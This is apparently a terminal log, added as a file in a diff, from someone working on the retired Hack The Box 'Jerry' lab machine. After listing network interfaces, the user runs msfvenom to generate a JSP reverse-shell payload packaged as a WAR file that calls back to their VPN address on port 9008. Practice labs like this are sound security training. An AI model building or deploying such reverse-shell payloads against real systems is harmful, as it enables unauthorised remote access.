@@ -1,0 +1,47 @@
+arjun@broly:~/Documents/HacktheBox/retired/jerry$ ip a   
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                       
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                         
+    inet 127.0.0.1/8 scope host lo                       
+       valid_lft forever preferred_lft forever           
+    inet6 ::1/128 scope host                             
+       valid_lft forever preferred_lft forever           
+2: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000         
+    link/ether 2c:4d:54:27:8d:82 brd ff:ff:ff:ff:ff:ff   
+3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000               
+    link/ether d0:57:7b:8c:5b:9a brd ff:ff:ff:ff:ff:ff   
+    inet 100.64.9.228/20 brd 100.64.15.255 scope global dynamic noprefixroute wlan0                               
+       valid_lft 5294sec preferred_lft 5294sec           
+    inet6 fe80::a673:a3db:78c5:f405/64 scope link noprefixroute                                                   
+       valid_lft forever preferred_lft forever           
+5: vmnet1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000      
+    link/ether 00:50:56:c0:00:01 brd ff:ff:ff:ff:ff:ff   
+    inet 172.16.192.1/24 brd 172.16.192.255 scope global vmnet1                                                   
+       valid_lft forever preferred_lft forever           
+    inet6 fe80::250:56ff:fec0:1/64 scope link            
+       valid_lft forever preferred_lft forever           
+6: vmnet8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000      
+    link/ether 00:50:56:c0:00:08 brd ff:ff:ff:ff:ff:ff   
+    inet 192.168.211.1/24 brd 192.168.211.255 scope global vmnet8                                                 
+       valid_lft forever preferred_lft forever           
+    inet6 fe80::250:56ff:fec0:8/64 scope link            
+       valid_lft forever preferred_lft forever           
+7: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100 
+    link/none               
+    inet 10.10.14.18/23 brd 10.10.15.255 scope global tun0                                                        
+       valid_lft forever preferred_lft forever           
+    inet6 dead:beef:2::1010/64 scope global              
+       valid_lft forever preferred_lft forever           
+    inet6 fe80::f3ac:b9c6:6630:3e92/64 scope link stable-privacy                                                  
+       valid_lft forever preferred_lft forever           
+arjun@broly:~/Documents/HacktheBox/retired/jerry$ sudo msfvenom -l payload | grep jsp                             
+[sudo] password for arjun:  
+    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell         
+    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell        
+arjun@broly:~/Documents/HacktheBox/retired/jerry$ sudo msfvenom -p java/jsp_sehll_reverse_tcp LHOST=10.10.14.18 LPORT=9008 -f war > exploit.war                            
+Error: invalid payload: java/jsp_sehll_reverse_tcp       
+arjun@broly:~/Documents/HacktheBox/retired/jerry$ sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LP
+ORT=9008 -f war > exploit.war                                                                                     
+Payload size: 1096 bytes    
+Final size of war file: 1096 bytes                       
+
+arjun@broly:~/Documents/HacktheBox/retired/jerry$        
